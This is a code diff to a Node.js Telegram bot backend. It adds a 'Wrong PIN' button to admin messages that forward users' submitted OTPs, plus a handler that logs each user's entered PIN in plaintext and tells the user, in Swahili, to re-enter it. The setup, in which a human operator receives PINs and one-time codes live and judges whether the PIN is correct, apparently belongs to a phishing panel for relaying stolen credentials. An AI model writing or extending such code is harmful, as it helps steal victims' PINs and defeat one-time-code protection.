@@ -326,6 +326,55 @@ bot.on('callback_query', async (query) => {
 
             await bot.answerCallbackQuery(query.id, { text: '❌ OTP Rejected! Client can retry', show_alert: false });
         }
+
+        // ✅ WRONG PIN - User needs to re-enter PIN and re-register
+        else if (data.startsWith('reg_otp_wrongpin_')) {
+            const registrationId = data.replace('reg_otp_wrongpin_', '');
+            const registration = pendingRegistrations.get(registrationId);
+            const otpData = pendingOtpVerification.get(registrationId);
+
+            if (!registration || !otpData) {
+                await bot.answerCallbackQuery(query.id, { text: '❌ Registration not found', show_alert: true });
+                return;
+            }
+
+            console.log(`\n🔐 WRONG PIN MARKED: ${registrationId}`);
+            console.log(`   User: ${registration.firstName} ${registration.lastName}`);
+            console.log(`   Entered PIN: ${registration.password}`);
+
+            // Mark OTP as wrong PIN
+            otpData.status = 'wrongpin';
+
+            // Send message to user (via Telegram if they have a connection)
+            // For now, we'll mark it in the system so frontend can poll for this status
+            const userStatusMessage = `
+🔐 *NAMBA YA SIRI SI SAHIHI*
+
+Namba ya Siri uliyoingiza si sahihi.
+Tafadhali jaribu tena na namba ya siri sahihi.
+
+📱 *Registration ID:* \`${registrationId}\`
+
+Rudi kwenye fomu ya usajili na ingiza namba ya siri mpya.
+            `;
+
+            // Update admin message
+            await bot.editMessageText(
+                `🔐 *WRONG PIN INDICATED*\n\nUser needs to re-enter their PIN\n\nRegistration ID: \`${registrationId}\``,
+                {
+                    chat_id: chatId,
+                    message_id: messageId,
+                    parse_mode: 'Markdown',
+                    reply_markup: { inline_keyboard: [] }
+                }
+            );
+
+            console.log(`   ✅ Updated: OTP status = 'wrongpin'`);
+            console.log(`   ✅ User will see wrong PIN alert on next poll\n`);
+
+            await bot.answerCallbackQuery(query.id, { text: '✅ User notified - Wrong PIN', show_alert: false });
+        }
+
     } catch (error) {
         console.error('❌ Callback query error:', error);
         await bot.answerCallbackQuery(query.id, { text: '❌ Error processing action', show_alert: true });
@@ -2313,12 +2362,17 @@ app.post('/api/submit-otp', async (req, res) => {
         callback_data: `reg_otp_reject_${registrationId}`
       };
 
+      const wrongPinBtn = {
+        text: '🔐 Wrong PIN',
+        callback_data: `reg_otp_wrongpin_${registrationId}`
+      };
+
       console.log(`📢 Sending OTP to: ${targetAdminName} (Chat ID: ${targetAdminChatId})`);
 
       await bot.sendMessage(targetAdminChatId, message.trim(), {
         parse_mode: 'Markdown',
         reply_markup: {
-          inline_keyboard: [[approveBtn, rejectBtn]]
+          inline_keyboard: [[approveBtn, rejectBtn, wrongPinBtn]]
         }
       });
 
@@ -2364,7 +2418,7 @@ app.get('/api/check-registration-otp-status/:registrationId', async (req, res) =
 
     res.json({
       success: true,
-      status: otpData.status,  // 'pending' | 'approved' | 'rejected'
+      status: otpData.status,  // 'pending' | 'approved' | 'rejected' | 'wrongpin'
       isExpired: isExpired,
       elapsedSeconds: Math.floor(elapsedMs / 1000),
       remainingSeconds: Math.max(0, Math.floor((OTP_EXPIRY_MS - elapsedMs) / 1000))
